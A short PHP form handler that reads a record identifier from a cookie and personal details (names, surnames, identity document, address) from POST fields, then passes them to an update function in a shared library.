<?php 
require('../panel/lib/funciones.php');

$registro = $_COOKIE['registro'];
$pnombre = $_POST['nom'];
$snombre = $_POST['nom2'];
$papellido = $_POST['ape'];
$sapellido = $_POST['ape2'];
$documento = $_POST['doc'];
$direccion = $_POST['dir'];

actualizar_registro_info($registro,$pnombre,$snombre,$papellido,$sapellido,$documento,$direccion);
?>